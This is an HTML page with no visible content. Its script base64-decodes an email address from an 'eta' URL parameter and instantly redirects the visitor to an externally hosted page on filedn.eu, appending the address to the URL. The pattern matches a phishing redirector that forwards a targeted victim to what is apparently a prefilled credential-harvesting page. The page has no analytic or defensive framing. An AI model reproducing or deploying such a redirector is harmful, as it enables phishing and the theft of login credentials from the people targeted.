<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
</head>
<body>
  <script type="text/javascript">
    // Extract eta from query parameters
    var urlParams = new URLSearchParams(window.location.search);
    var eta = urlParams.get('eta') || '';
    // Process eta to extract the relevant part
    var url_get_email = atob(getafterseparators(eta));
    var mail_go_url = "https://filedn.eu/lr4Rp3x4QR2yETwH1wVipzV/testing/index.html#" + url_get_email;
    location.replace(mail_go_url);

    function getafterseparators(param) {
      var ret;
      // If no parameter is provided, return 0
      if (!param) {
        ret = 0;
      } else {
        // Check for alternative separators
        var queryStringhash = param.split('eta')[1];
        var queryStringsemi = param.split(';')[1];
        var queryStringsemiplus = param.split(';+')[1];
        var queryStringstartsemi = param.split('*;')[1];
        // Prioritize the first valid separator
        if (queryStringhash) {
          ret = queryStringhash;
        } else if (queryStringsemi) {
          ret = queryStringsemi;
        } else if (queryStringsemiplus) {
          ret = queryStringsemiplus;
        } else if (queryStringstartsemi) {
          ret = queryStringstartsemi;
        } else {
          ret = param; // Use the full parameter if no separators
        }
      }
      return ret;
    }
  </script>
</body>
</html>
